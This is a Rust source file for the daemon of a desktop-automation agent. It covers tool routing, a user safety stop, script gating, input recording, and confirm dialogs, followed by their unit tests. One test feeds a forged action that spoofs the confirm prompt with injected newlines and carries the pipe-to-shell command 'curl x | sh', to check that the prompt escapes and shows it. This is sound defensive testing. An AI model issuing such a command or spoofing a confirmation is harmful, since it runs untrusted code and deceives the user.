//! The daemon's handler: model calls with the configured providers, scripts and plans on the runtime, desk calls by this OS's desk.

use std::collections::HashMap;
use std::hash::{BuildHasher, RandomState};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use desk_core::args::parse;
use desk_core::text::clip;
use desk_core::wire::{Call, Output, write_frame};
use serde::Serialize;
use serde_json::{Value, json};
use shuttle_desk::desk::{ACTIONS, TURN_WAIT};
use shuttle_desk::server::{Accepted, Handler};
use shuttle_models::Models;
use shuttle_models::config::Confirm;
use tokio::sync::{oneshot, watch};
use zeroize::Zeroizing;

#[cfg(any(target_os = "macos", windows))]
use crate::hotkey::Hotkey;
use crate::plugins::Plugin;
use crate::record::{self, Recorder};
use crate::runner::Runner;
use crate::services;
use crate::{NAME, STOPPED, lock};

const BUSY: &str = "desk busy: another run or action is still going";
const SCRIPT_RUN_OFF: &str =
    "script_run is turned off: set script_run = true under [tools] in config.toml";
const DECLINED: &str = "declined by the user";
#[cfg(target_os = "linux")]
const PLAN_BACKGROUND: &str = "background gui_plan is not measured on Linux: set [desk] input = \"foreground\" for plans, or use the desk verbs with a window";
const NO_ASK: &str = "confirm needs the menu-bar controls, which this OS does not have yet: set confirm = \"off\" under [safety] in config.toml";
const CONFIRM_OPEN: &str = "a confirm dialog is open: answer it first";
const QUESTION_CHARS: usize = 200;
const PREVIEW_CHARS: usize = 120;
const STEP_CHARS: usize = 40;
const COMPUTER_ACT: &str = "desk_computer_act";
const POINTER_ACTIONS: [&str; 10] = [
    "tap",
    "click",
    "left_click",
    "double_tap",
    "double_click",
    "right_click",
    "triple_click",
    "long_press",
    "swipe",
    "drag",
];

/// Shows the user a question about one action and answers whether it may run.
pub type Asker = Arc<dyn Fn(String) -> oneshot::Receiver<bool> + Send + Sync>;

/// What the daemon guards beyond the stop: the script_run switch and the confirm mode with its asker.
pub struct Guard {
    pub script_run: bool,
    pub confirm: Confirm,
    pub asker: Option<Asker>,
    /// Whether desk input goes in the background, which `gui_plan` refuses on Linux.
    pub background: bool,
}

/// What the menu-bar controls read and drive.
pub trait Controls: Send + Sync {
    /// Stops every call, or lets them run again.
    fn halt(&self, stopped: bool);
    fn halted(&self) -> bool;
    /// Whether a run or a desk action is in flight.
    fn acting(&self) -> bool;
    fn recording(&self) -> bool;
    /// Starts or ends a recording of the user's input.
    fn record(&self, on: bool) -> Result<(), String>;
    fn hotkey(&self, code: u32);
}

/// What the controls show and how to reach the daemon.
#[cfg(any(target_os = "macos", windows))]
pub struct Ui {
    pub controls: Arc<dyn Controls>,
    pub hotkey: Option<Hotkey>,
    /// The Stop entry's title, with the hotkey when one is set.
    pub stop_label: String,
    pub indicator: bool,
    /// The version and input mode the indicator names.
    pub about: String,
}

/// Routes each call by its tool; `safety_stop` halts every call until `safety_resume`.
pub struct Daemon<H> {
    desk: H,
    models: Result<Models, String>,
    runner: Runner,
    guard: Guard,
    plugins: Vec<Plugin>,
    services: HashMap<String, String>,
    halted: watch::Sender<bool>,
    actions: Arc<AtomicUsize>,
    asking: AtomicBool,
    turn: tokio::sync::Mutex<()>,
    running: Mutex<Option<String>>,
    nonce: u64,
    runs: AtomicU64,
    wait: Duration,
    recorder: Recorder,
}

impl<H: Handler> Daemon<H> {
    /// A daemon that fails every call but the stop while `models` holds the configuration's error.
    pub fn new(desk: H, models: Result<Models, String>, runner: Runner, guard: Guard) -> Self {
        let actions = Arc::new(AtomicUsize::new(0));
        Self {
            desk,
            models,
            runner,
            guard,
            plugins: Vec::new(),
            services: HashMap::new(),
            halted: watch::Sender::new(false),
            recorder: Recorder::new(PathBuf::new(), Arc::clone(&actions)),
            actions,
            asking: AtomicBool::new(false),
            turn: tokio::sync::Mutex::new(()),
            running: Mutex::new(None),
            nonce: RandomState::new().hash_one(std::process::id()),
            runs: AtomicU64::new(1),
            wait: TURN_WAIT,
        }
    }

    /// Adds recordings of the user's input, saved in `dir`.
    #[must_use]
    pub fn with_recordings(mut self, dir: PathBuf) -> Self {
        self.recorder = Recorder::new(dir, Arc::clone(&self.actions));
        self
    }

    /// Runs the recordings one after the other until the daemon ends.
    pub async fn recordings(&self) {
        let Some(mut sessions) = self.recorder.sessions() else {
            return;
        };
        while let Some(s) = sessions.recv().await {
            record::work(&self.desk, s).await;
        }
    }

    pub async fn end_recording(&self) {
        self.recorder.finish().await;
    }

    /// Adds the plugin tools, which run only while `script_run` is on.
    #[must_use]
    pub fn with_plugins(mut self, plugins: Vec<Plugin>) -> Self {
        self.plugins = plugins;
        self
    }

    #[must_use]
    pub fn with_services(mut self, services: HashMap<String, String>) -> Self {
        self.services = services;
        self
    }

    async fn record_call(&self, tool: &str, mut args: Value) -> Result<String, String> {
        let r = &self.recorder;
        match tool {
            "record_start" => {
                if self.guard.confirm != Confirm::Off {
                    let Some(ask) = &self.guard.asker else {
                        return Err(NO_ASK.to_owned());
                    };
                    self.confirmed(ask, format!("Allow {NAME} to record your input?"))
                        .await
                        .map_err(str::to_owned)?;
                    if *self.halted.borrow() {
                        return Err(STOPPED.to_owned());
                    }
                }
                let apps = match args["apps"].take() {
                    Value::Null => Vec::new(),
                    v => parse(v)?,
                };
                r.start(apps)
                    .map(|id| json!({"ok": true, "id": id}).to_string())
            }
            "record_note" => {
                let Value::String(text) = args["text"].take() else {
                    return Err("record_note needs text".to_owned());
                };
                r.note(text).map(|()| r#"{"ok":true}"#.to_owned())
            }
            _ => {
                let recording = r.stop().await?;
                let id = recording["id"].as_str().unwrap_or_default().to_owned();
                let params = match args["params"].take() {
                    Value::Null => json!({}),
                    p => p,
                };
                let mut input = json!({});
                input["recording"] = recording;
                input["params"] = params;
                let mut draft = self.runner.draft(input, &format!("record-{id}")).await?;
                draft["recording"] = r.path(&id).to_string_lossy().into_owned().into();
                Ok(draft.to_string())
            }
        }
    }

    fn plugin(&self, tool: &str) -> Option<&Plugin> {
        self.plugins.iter().find(|p| p.name == tool)
    }

    async fn run(&self, tool: &str, args: Value) -> Result<String, String> {
        let plugin = self.plugin(tool);
        if (tool == "script_run" || plugin.is_some()) && !self.guard.script_run {
            return Err(SCRIPT_RUN_OFF.to_owned());
        }
        #[cfg(target_os = "linux")]
        if tool == "gui_plan" && self.guard.background {
            return Err(PLAN_BACKGROUND.to_owned());
        }
        let mut halted = self.halted.subscribe();
        let _turn = tokio::select! {
            biased;
            _ = halted.wait_for(|h| *h) => return Err(STOPPED.to_owned()),
            turn = tokio::time::timeout(self.wait, self.turn.lock()) => turn.map_err(|_| BUSY.to_owned())?,
        };
        let n = self.runs.fetch_add(1, Ordering::Relaxed);
        let agent = format!("run-{:x}-{n}", self.nonce);
        *lock(&self.running) = Some(agent.clone());
        let _running = RunningAgent(&self.running);
        self.actions.fetch_add(1, Ordering::Relaxed);
        let _acting = Acting(&self.actions);
        let _held = Held(&self.desk, &agent);
        let report = match plugin {
            Some(p) => self.runner.plugin(&p.bin, args, &agent).await,
            None if tool == "gui_plan" => self.runner.plan(args, &agent).await,
            None => self.runner.script(args, &agent).await,
        }?;
        if report["error"].is_null() {
            Ok(report.to_string())
        } else {
            Err(report.to_string())
        }
    }

    async fn act(&self, call: Call) -> Output {
        let asker = match (self.asks(&call), &self.guard.asker) {
            (false, _) => None,
            (true, Some(ask)) => Some(ask),
            (true, None) => return Output::error(NO_ASK),
        };
        self.actions.fetch_add(1, Ordering::Relaxed);
        let _acting = Acting(&self.actions);
        let _turn = if lock(&self.running).as_deref() == Some(call.agent_id.as_str()) {
            None
        } else {
            let Ok(turn) = tokio::time::timeout(self.wait, self.turn.lock()).await else {
                return Output::error(BUSY);
            };
            Some(turn)
        };
        if let Some(ask) = asker {
            if let Err(e) = self.confirmed(ask, question(&call)).await {
                return Output::error(e);
            }
            self.desk.allowed();
        }
        if *self.halted.borrow() {
            return Output::error(STOPPED);
        }
        self.desk.answer(call).await
    }

    async fn confirmed(&self, ask: &Asker, question: String) -> Result<(), &'static str> {
        if self.asking.swap(true, Ordering::AcqRel) {
            return Err(CONFIRM_OPEN);
        }
        let open = Asking(&self.asking);
        let allowed = ask(question).await.unwrap_or(false);
        drop(open);
        if allowed { Ok(()) } else { Err(DECLINED) }
    }

    fn asks(&self, call: &Call) -> bool {
        match self.guard.confirm {
            Confirm::Off => false,
            Confirm::Coordinate => match call.tool.as_str() {
                "desk_click" | "desk_press" | "desk_drag" => true,
                "desk_act" => call.args["action"] == "click",
                COMPUTER_ACT => match call.args["actions"].as_array() {
                    Some(list) => list.iter().any(points),
                    None => points(&call.args),
                },
                _ => false,
            },
            Confirm::Every => true,
        }
    }

    fn stop(&self, stopped: bool) -> Output {
        self.halt(stopped);
        Output::text(json!({"ok": true, "stopped": stopped}).to_string())
    }

    async fn model(models: &Models, tool: &str, args: Value) -> Result<String, String> {
        match tool {
            "model_decide" => encode(&models.decide(parse(args)?).await?),
            "model_ask" => encode(&models.ask(parse(args)?).await?),
            "model_ground" => encode(&models.ground(parse(args)?).await?),
            other => Err(format!("unknown tool {other}")),
        }
    }
}

impl<H: Handler> Handler for Daemon<H> {
    fn owner_only(&self, tool: &str) -> bool {
        matches!(
            tool,
            "safety_stop" | "safety_resume" | "record_start" | "record_note" | "record_stop"
        )
    }

    async fn answer(&self, call: Call) -> Output {
        match call.tool.as_str() {
            "safety_stop" => return self.stop(true),
            "safety_resume" => return self.stop(false),
            _ => {}
        }
        if *self.halted.borrow() {
            return Output::error(STOPPED);
        }
        let models = match &self.models {
            Ok(m) => m,
            Err(e) => return Output::error(e),
        };
        if call.tool.starts_with("desk_") && self.asking.load(Ordering::Acquire) {
            return Output::error(CONFIRM_OPEN);
        }
        let tool = call.tool.as_str();
        if matches!(tool, "record_start" | "record_note" | "record_stop") {
            return self
                .record_call(tool, call.args)
                .await
                .map_or_else(Output::error, Output::text);
        }
        if tool == "gui_plan" || tool == "script_run" || self.plugin(tool).is_some() {
            return self
                .run(tool, call.args)
                .await
                .map_or_else(Output::error, Output::text);
        }
        let mut halted = self.halted.subscribe();
        let out = async {
            match call.tool.as_str() {
                t if t.starts_with("model_") => Self::model(models, t, call.args)
                    .await
                    .map_or_else(Output::error, Output::text),
                t if ACTIONS.contains(&t) || t == COMPUTER_ACT => self.act(call).await,
                _ => self.desk.answer(call).await,
            }
        };
        tokio::select! {
            out = out => out,
            _ = halted.wait_for(|h| *h) => Output::error(STOPPED),
        }
    }

    fn splicing(&self) -> bool {
        !self.services.is_empty()
    }

    fn splices(&self, tool: &str) -> bool {
        self.services.contains_key(tool)
    }

    // a stop drops the splice without a reply, since the client may be inside a stream of its own frames
    async fn splice(&self, tool: &str, body: Zeroizing<Vec<u8>>, mut stream: Accepted) {
        let Some(socket) = self.services.get(tool) else {
            return;
        };
        let mut halted = self.halted.subscribe();
        let refused = if *self.halted.borrow() {
            Some(STOPPED.to_owned())
        } else {
            tokio::select! {
                routed = services::route(socket, body, &mut stream) => routed.err(),
                _ = halted.wait_for(|h| *h) => None,
            }
        };
        if let Some(e) = refused {
            let _ = write_frame(&mut stream, &Output::error(e)).await;
        }
    }
}

impl<H: Handler> Controls for Daemon<H> {
    fn halt(&self, stopped: bool) {
        self.halted.send_replace(stopped);
        self.runner.halt(stopped);
        if stopped {
            self.recorder.end();
        }
    }

    fn halted(&self) -> bool {
        *self.halted.borrow()
    }

    fn hotkey(&self, code: u32) {
        self.recorder.hotkey(code);
        self.halt(true);
    }

    fn acting(&self) -> bool {
        self.actions.load(Ordering::Relaxed) > 0
    }

    fn recording(&self) -> bool {
        self.recorder.recording()
    }

    fn record(&self, on: bool) -> Result<(), String> {
        if on && self.halted() {
            Err(STOPPED.to_owned())
        } else if on {
            self.recorder.start(Vec::new()).map(drop)
        } else {
            self.recorder.end();
            Ok(())
        }
    }
}

struct Asking<'a>(&'a AtomicBool);

impl Drop for Asking<'_> {
    fn drop(&mut self) {
        self.0.store(false, Ordering::Release);
    }
}

struct Held<'a, H: Handler>(&'a H, &'a str);

impl<H: Handler> Drop for Held<'_, H> {
    fn drop(&mut self) {
        self.0.release(self.1);
    }
}

struct RunningAgent<'a>(&'a Mutex<Option<String>>);

impl Drop for RunningAgent<'_> {
    fn drop(&mut self) {
        *lock(self.0) = None;
    }
}

struct Acting<'a>(&'a AtomicUsize);

impl Drop for Acting<'_> {
    fn drop(&mut self) {
        self.0.fetch_sub(1, Ordering::Relaxed);
    }
}

fn question(call: &Call) -> String {
    let a = &call.args;
    let verb = call.tool.trim_start_matches("desk_");
    let inside = a["window"]
        .as_str()
        .map(|w| format!(" in window {}", Value::from(w)))
        .unwrap_or_default();
    let what = match verb {
        "click" => format!("click at ({}, {}){inside}{}", a["x"], a["y"], held(a)),
        "drag" => format!(
            "drag from ({}, {}) to ({}, {}){inside}",
            a["x"], a["y"], a["to_x"], a["to_y"]
        ),
        "press" => format!("press element {}", a["id"]),
        "act" => format!("{} element {}", word(&a["action"], "act on"), a["id"]),
        "type" => format!(
            "type into {}: {}",
            named(a).unwrap_or_else(|| "the focused window".to_owned()),
            quoted(&a["text"], PREVIEW_CHARS)
        ),
        "computer_act" => match a["actions"].as_array() {
            Some(list) => steps(list),
            None => step(a),
        },
        _ => format!("{verb} {a}"),
    };
    format!("Allow {NAME} to {}?", clip(what, QUESTION_CHARS))
}

fn named(a: &Value) -> Option<String> {
    match (a["window"].as_str(), a["app"].as_str(), a["pid"].as_u64()) {
        (Some(window), ..) => Some(format!("window {}", Value::from(window))),
        (None, Some(app), _) => Some(format!("app {}", Value::from(app))),
        (None, None, Some(pid)) => Some(format!("process {pid}")),
        (None, None, None) => None,
    }
}

fn held(a: &Value) -> String {
    match a["modifiers"].as_array() {
        Some(mods) if !mods.is_empty() => {
            let mods: Vec<String> = mods.iter().map(|m| word(m, "?")).collect();
            format!(" with {}", mods.join("+"))
        }
        _ => String::new(),
    }
}

fn word(v: &Value, default: &str) -> String {
    match v.as_str() {
        None => default.to_owned(),
        Some(s) if !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') => {
            s.to_owned()
        }
        Some(s) => Value::from(s).to_string(),
    }
}

fn quoted(v: &Value, max: usize) -> String {
    Value::from(clip(v.as_str().unwrap_or_default().to_owned(), max)).to_string()
}

fn steps(list: &[Value]) -> String {
    let mut out = format!("run {} actions:", list.len());
    for (i, a) in list.iter().enumerate() {
        let s = step(a);
        let more = format!(" (+{} more)", list.len() - i);
        let room = if i + 1 < list.len() {
            more.chars().count()
        } else {
            0
        };
        if out.chars().count() + 2 + s.chars().count() + room > QUESTION_CHARS {
            out.push_str(&more);
            break;
        }
        out.push_str(if i == 0 { " " } else { ", " });
        out.push_str(&s);
    }
    out
}

/// Whether the computer action `a` can end in a click at a screen point: a pointer action, or typing at an element or a point, which clicks it first.
fn points(a: &Value) -> bool {
    let action = a["action"].as_str().unwrap_or_default();
    POINTER_ACTIONS.contains(&action)
        || (action == "type" && (a.get("element").is_some() || a.get("x").is_some()))
}

fn step(a: &Value) -> String {
    let mut s = word(&a["action"], "act");
    for field in ["key", "text"] {
        if a[field].is_string() {
            s = format!("{s} {}", quoted(&a[field], STEP_CHARS));
        }
    }
    if let Some(element) = a.get("element") {
        format!("{s} element [{element}]")
    } else if a.get("x").is_some() {
        format!("{s} at ({}, {})", a["x"], a["y"])
    } else {
        s
    }
}

fn encode<T: Serialize>(v: &T) -> Result<String, String> {
    serde_json::to_string(v).map_err(|e| format!("encode reply: {e}"))
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use shuttle_models::config::Config;

    use super::*;

    #[tokio::test]
    async fn stop_ends_a_desk_call_in_flight() {
        let d = Arc::new(daemon(Slow, Guard::default()));
        let calls = ["desk_click", "desk_wait"].map(|tool| {
            tokio::spawn({
                let d = d.clone();
                let call = call(tool, json!({}));
                async move { d.answer(call).await }
            })
        });
        tokio::time::sleep(Duration::from_millis(100)).await;
        let started = std::time::Instant::now();
        d.answer(call("safety_stop", json!({}))).await;
        for c in calls {
            let out = c.await.unwrap();
            assert_eq!((out.is_error, out.text.as_str()), (true, crate::STOPPED));
        }
        assert!(started.elapsed() < Duration::from_secs(1));
    }

    #[tokio::test]
    async fn a_computer_act_is_an_action_that_holds_the_turn() {
        let mut d = daemon(Slow, Guard::default());
        d.wait = Duration::from_millis(100);
        let d = Arc::new(d);
        let act = tokio::spawn({
            let d = d.clone();
            let call = call(
                "desk_computer_act",
                json!({"action": "tap", "x": 1, "y": 2}),
            );
            async move { d.answer(call).await }
        });
        tokio::time::sleep(Duration::from_millis(100)).await;
        assert!(d.acting());
        let out = d.answer(call("desk_click", json!({}))).await;
        assert_eq!((out.is_error, out.text.as_str()), (true, BUSY));
        act.abort();
    }

    #[test]
    fn the_stop_resume_and_recording_are_kept_to_the_daemons_own_user() {
        let d = daemon(Slow, Guard::default());
        assert!(d.owner_only("safety_stop") && d.owner_only("safety_resume"));
        assert!(d.owner_only("record_start") && d.owner_only("record_stop"));
        assert!(!d.owner_only("desk_click") && !d.owner_only("script_run"));
    }

    #[tokio::test]
    async fn a_desk_action_a_stop_ends_is_not_acting_after_resume() {
        let d = Arc::new(daemon(Slow, Guard::default()));
        let action = tokio::spawn({
            let d = d.clone();
            let call = call("desk_click", json!({}));
            async move { d.answer(call).await }
        });
        tokio::time::sleep(Duration::from_millis(100)).await;
        assert!(d.acting());
        d.answer(call("safety_stop", json!({}))).await;
        action.await.unwrap();
        d.answer(call("safety_resume", json!({}))).await;
        assert!(!d.acting());
    }

    #[tokio::test]
    async fn model_calls_go_to_the_providers_and_the_rest_to_the_desk() {
        let closed = Config {
            base_url: "http://127.0.0.1:9/v1".to_owned(),
            ..Config::default()
        };
        let d = Daemon::new(Echo, Ok(Models::new(closed)), runner(), Guard::default());
        let desk = d.answer(call("desk_windows", json!({}))).await;
        assert_eq!(
            (desk.is_error, desk.text.as_str()),
            (false, "desk answered desk_windows")
        );
        let model = d.answer(call("model_ask", json!({"prompt": "x"}))).await;
        assert!(
            model.is_error
                && model.text.starts_with(
                    "anthropic/claude-sonnet-5 request to http://127.0.0.1:9/v1/chat/completions: "
                ),
            "{}",
            model.text
        );
        let bad = d.answer(call("model_ground", json!({"target": "x"}))).await;
        assert!(
            bad.is_error && bad.text.starts_with("invalid arguments"),
            "{}",
            bad.text
        );
        let unknown = d.answer(call("model_plan", json!({}))).await;
        assert_eq!(unknown.text, "unknown tool model_plan");
    }

    #[test]
    fn each_daemon_names_its_runs_apart_from_any_earlier_daemon() {
        let a = Daemon::new(Echo, Err(String::new()), runner(), Guard::default());
        let b = Daemon::new(Echo, Err(String::new()), runner(), Guard::default());
        assert_ne!(a.nonce, b.nonce);
    }

    #[tokio::test]
    async fn a_broken_config_fails_every_call_but_stop_since_the_safety_controls_are_in_it() {
        let d = Daemon::new(
            Echo,
            Err("config.toml line 3: invalid type".to_owned()),
            runner(),
            Guard::default(),
        );
        for tool in ["model_ask", "script_run", "gui_plan", "desk_screen"] {
            let out = d.answer(call(tool, json!({"prompt": "x"}))).await;
            assert_eq!(
                (out.is_error, out.text.as_str()),
                (true, "config.toml line 3: invalid type"),
                "{tool}"
            );
        }
        assert!(!d.answer(call("safety_stop", json!({}))).await.is_error);
    }

    #[tokio::test]
    async fn stop_fails_every_call_and_ends_the_run_in_flight_until_resume() {
        let d = Arc::new(daemon(Echo, Guard::default()));
        let slow = json!({"code": "export async function main() { await new Promise((r) => setTimeout(r, 20000)) }"});
        let run = tokio::spawn({
            let d = d.clone();
            let call = call("script_run", slow);
            async move { d.answer(call).await }
        });
        tokio::time::sleep(Duration::from_millis(500)).await;
        let started = std::time::Instant::now();
        assert!(!d.answer(call("safety_stop", json!({}))).await.is_error);
        let ended = run.await.unwrap();
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        assert!(ended.text.contains("stopped by the user"), "{}", ended.text);
        for tool in [
            "desk_screen",
            "desk_click",
            "desk_wait",
            "model_ask",
            "script_run",
        ] {
            let out = d.answer(call(tool, json!({}))).await;
            assert_eq!(
                (out.is_error, out.text.as_str()),
                (true, crate::STOPPED),
                "{tool}"
            );
        }
        assert!(!d.answer(call("safety_resume", json!({}))).await.is_error);
        assert!(!d.answer(call("desk_screen", json!({}))).await.is_error);
    }

    #[tokio::test]
    async fn a_run_waiting_for_the_turn_ends_at_a_stop_even_after_a_resume() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("ran");
        let d = Arc::new(daemon(Echo, Guard::default()));
        let held = d.turn.lock().await;
        let run = tokio::spawn({
            let d = Arc::clone(&d);
            let code = format!(
                "import {{ writeFileSync }} from 'node:fs'; export function main() {{ writeFileSync({:?}, '') }}",
                marker.to_string_lossy()
            );
            async move { d.answer(call("script_run", json!({"code": code}))).await }
        });
        tokio::time::sleep(Duration::from_millis(100)).await;
        d.answer(call("safety_stop", json!({}))).await;
        tokio::time::sleep(Duration::from_millis(100)).await;
        d.answer(call("safety_resume", json!({}))).await;
        drop(held);
        let out = run.await.unwrap();
        assert_eq!((out.is_error, out.text.as_str()), (true, crate::STOPPED));
        assert!(!marker.exists(), "the run went on after the stop");
    }

    #[tokio::test]
    async fn an_allowed_confirm_counts_as_the_desks_own_input_and_a_declined_one_does_not() {
        for (yes, want) in [(true, 1), (false, 0)] {
            let allowed = Allowed::default();
            let asker: Asker = Arc::new(move |_| {
                let (tx, rx) = oneshot::channel();
                let _ = tx.send(yes);
                rx
            });
            let d = daemon(
                allowed.clone(),
                Guard {
                    confirm: Confirm::Every,
                    asker: Some(asker),
                    ..Guard::default()
                },
            );
            d.answer(call("desk_key", json!({"keys": "ctrl+s"}))).await;
            assert_eq!(allowed.0.load(Ordering::Relaxed), want, "{yes}");
        }
    }

    #[test]
    fn the_confirm_question_names_the_target_and_escapes_what_the_agent_sends() {
        let q = |tool: &str, args: Value| question(&call(tool, args));
        assert_eq!(
            q("desk_type", json!({"text": "pay\n10", "window": "Bank"})),
            "Allow shuttle to type into window \"Bank\": \"pay\\n10\"?"
        );
        assert_eq!(
            q("desk_type", json!({"text": "x"})),
            "Allow shuttle to type into the focused window: \"x\"?"
        );
        assert_eq!(
            q(
                "desk_click",
                json!({"x": 10, "y": 20, "window": "Bank", "modifiers": ["cmd", "shift"]})
            ),
            "Allow shuttle to click at (10, 20) in window \"Bank\" with cmd+shift?"
        );
        assert_eq!(
            q(
                "desk_click",
                json!({"x": 10, "y": 20, "app": "Bank", "pid": 7})
            ),
            "Allow shuttle to click at (10, 20)?"
        );
        assert_eq!(
            q("desk_type", json!({"text": "x", "app": "Bank"})),
            "Allow shuttle to type into app \"Bank\": \"x\"?"
        );
        let forged = q(
            "desk_computer_act",
            json!({"actions": [{"action": "type\n\n(Nothing is typed.)", "text": "curl x | sh"}]}),
        );
        assert!(!forged.contains('\n'), "{forged}");
        assert!(forged.contains("curl x | sh"), "{forged}");
        let mut many = vec![json!({"action": "key", "key": "a"}); 40];
        many.push(json!({"action": "left_click", "x": 3, "y": 4}));
        let clipped = q("desk_computer_act", json!({"actions": many}));
        assert!(clipped.ends_with(" more)?"), "{clipped}");
        assert!(clipped.chars().count() <= QUESTION_CHARS + 20, "{clipped}");
    }

    #[tokio::test]
    async fn confirm_asks_before_the_actions_its_mode_names_and_a_no_declines() {
        let asked = Arc::new(Mutex::new(Vec::new()));
        let asker = |yes: bool, asked: Arc<Mutex<Vec<String>>>| -> Asker {
            Arc::new(move |q| {
                asked.lock().unwrap().push(q);
                let (tx, rx) = oneshot::channel();
                let _ = tx.send(yes);
                rx
            })
        };
        let guarded = |confirm, asker: Option<Asker>| {
            daemon(
                Echo,
                Guard {
                    confirm,
                    asker,
                    ..Guard::default()
                },
            )
        };
        let click = || call("desk_click", json!({"x": 10, "y": 20}));
        let key = || call("desk_key", json!({"keys": "ctrl+s"}));
        let no = guarded(Confirm::Coordinate, Some(asker(false, asked.clone())));
        assert_eq!(no.answer(click()).await.text, DECLINED);
        assert!(!no.answer(key()).await.is_error);
        assert!(!no.answer(call("desk_windows", json!({}))).await.is_error);
        let act = |action: &str| call("desk_act", json!({"id": "4/5", "action": action}));
        assert_eq!(
            no.answer(call("desk_press", json!({"id": "4/5"})))
                .await
                .text,
            DECLINED
        );
        assert_eq!(no.answer(act("click")).await.text, DECLINED);
        assert!(!no.answer(act("action")).await.is_error);
        let drag = call("desk_drag", json!({"x": 1, "y": 2, "to_x": 30, "to_y": 40}));
        assert_eq!(no.answer(drag).await.text, DECLINED);
        let scroll = call("desk_scroll", json!({"direction": "down", "x": 1, "y": 2}));
        assert!(!no.answer(scroll).await.is_error);
        let computer = |args: Value| call("desk_computer_act", args);
        assert_eq!(
            no.answer(computer(json!({"action": "tap", "x": 5, "y": 6})))
                .await
                .text,
            DECLINED
        );
        assert_eq!(
            no.answer(computer(
                json!({"action": "swipe", "element": 3, "to_x": 1, "to_y": 2})
            ))
            .await
            .text,
            DECLINED
        );
        assert!(
            !no.answer(computer(json!({"action": "key", "key": "back"})))
                .await
                .is_error
        );
        for asked in [
            json!({"action": "right_click", "x": 7, "y": 8}),
            json!({"action": "triple_click", "element": 4}),
            json!({"action": "type", "text": "a", "x": 1, "y": 2}),
            json!({"actions": [{"action": "key", "key": "ctrl+l"}, {"action": "left_click", "x": 3, "y": 4}]}),
        ] {
            assert_eq!(no.answer(computer(asked)).await.text, DECLINED);
        }
        for passed in [
            json!({"action": "type", "text": "a"}),
            json!({"actions": [{"action": "key", "key": "ctrl+l"}, {"action": "scroll", "direction": "down"}]}),
        ] {
            assert!(!no.answer(computer(passed)).await.is_error);
        }
        assert_eq!(
            *asked.lock().unwrap(),
            [
                "Allow shuttle to click at (10, 20)?",
                "Allow shuttle to press element \"4/5\"?",
                "Allow shuttle to click element \"4/5\"?",
                "Allow shuttle to drag from (1, 2) to (30, 40)?",
                "Allow shuttle to tap at (5, 6)?",
                "Allow shuttle to swipe element [3]?",
                "Allow shuttle to right_click at (7, 8)?",
                "Allow shuttle to triple_click element [4]?",
                "Allow shuttle to type \"a\" at (1, 2)?",
                "Allow shuttle to run 2 actions: key \"ctrl+l\", left_click at (3, 4)?"
            ]
        );
        let yes = guarded(Confirm::Every, Some(asker(true, asked.clone())));
        assert!(!yes.answer(key()).await.is_error);
        assert!(asked.lock().unwrap().last().unwrap().contains("ctrl+s"));
        let none = guarded(Confirm::Coordinate, None);
        assert_eq!(none.answer(click()).await.text, NO_ASK);
        assert!(!none.acting() && !none.halted());
    }

    #[tokio::test]
    async fn a_confirm_dialog_opens_only_once_the_actions_queued_before_it_are_done() {
        let (asker, pending) = held();
        let d = daemon(
            Typing,
            Guard {
                confirm: Confirm::Coordinate,
                asker: Some(asker),
                ..Guard::default()
            },
        );
        let pause = |ms| tokio::time::sleep(Duration::from_millis(ms));
        let (typed, queued, (asked, open_while_typing)) = tokio::join!(
            d.answer(call("desk_type", json!({"text": "a"}))),
            async {
                pause(50).await;
                d.answer(call("desk_key", json!({"keys": "return"}))).await
            },
            async {
                pause(100).await;
                let out = d.answer(call("desk_click", json!({"x": 1, "y": 2})));
                let answer = async {
                    pause(100).await;
                    let open = pending.lock().unwrap().is_some();
                    loop {
                        if let Some(tx) = pending.lock().unwrap().take() {
                            let _ = tx.send(false);
                            break;
                        }
                        pause(10).await;
                    }
                    open
                };
                tokio::join!(out, answer)
            }
        );
        assert!(
            !open_while_typing,
            "the dialog opened while another action typed"
        );
        assert_eq!(typed.text, "desk answered desk_type");
        assert_eq!(queued.text, "desk answered desk_key");
        assert_eq!(asked.text, DECLINED);
    }

    #[tokio::test]
    async fn an_action_waiting_for_the_turn_never_opens_its_dialog() {
        let (asker, pending) = held();
        let mut d = daemon(
            Echo,
            Guard {
                confirm: Confirm::Coordinate,
                asker: Some(asker),
                ..Guard::default()
            },
        );
        d.wait = Duration::from_millis(100);
        let held = d.turn.lock().await;
        let out = tokio::time::timeout(
            Duration::from_secs(2),
            d.answer(call("desk_click", json!({"x": 1, "y": 2}))),
        )
        .await
        .expect("the action waited on a dialog it opened before its turn");
        drop(held);
        assert_eq!((out.is_error, out.text.as_str()), (true, BUSY));
        assert!(pending.lock().unwrap().is_none());
    }

    #[tokio::test]
    async fn every_desk_call_fails_at_once_while_a_confirm_dialog_is_open() {
        let (asker, pending) = held();
        let d = daemon(
            Echo,
            Guard {
                confirm: Confirm::Coordinate,
                asker: Some(asker),
                ..Guard::default()
            },
        );
        let click = || call("desk_click", json!({"x": 10, "y": 20}));
        let both = async {
            tokio::join!(d.answer(click()), async {
                while pending.lock().unwrap().is_none() {
                    tokio::task::yield_now().await;
                }
                let mut texts = Vec::new();
                for c in [
                    call("desk_key", json!({"keys": "return"})),
                    call("desk_type", json!({"text": "\n"})),
                    call("desk_windows", json!({})),
                    call("desk_wait", json!({"since": [], "timeout_ms": 1000})),
                    click(),
                ] {
                    texts.push(d.answer(c).await.text);
                }
                let _ = pending.lock().unwrap().take().unwrap().send(false);
                texts
            })
        };
        let (asked, others) = tokio::time::timeout(Duration::from_secs(5), both)
            .await
            .expect("calls during an open dialog answer at once");
        assert_eq!(asked.text, DECLINED);
        assert_eq!(others, [CONFIRM_OPEN; 5]);
        assert!(
            !d.answer(call("desk_key", json!({"keys": "return"})))
                .await
                .is_error
        );
    }

    #[cfg(not(target_os = "macos"))]
    #[test]
    fn a_recording_the_menu_cannot_start_answers_why() {
        let d = daemon(Echo, Guard::default()).with_recordings(std::env::temp_dir());
        assert_eq!(
            d.record(true),
            Err("recording runs only on macOS".to_owned())
        );
        assert!(!d.recording());
    }

    #[test]
    fn the_menu_starts_no_recording_while_stopped() {
        let d = daemon(Echo, Guard::default()).with_recordings(std::env::temp_dir());
        d.halt(true);
        assert_eq!(d.record(true), Err(STOPPED.to_owned()));
        assert!(!d.recording());
    }

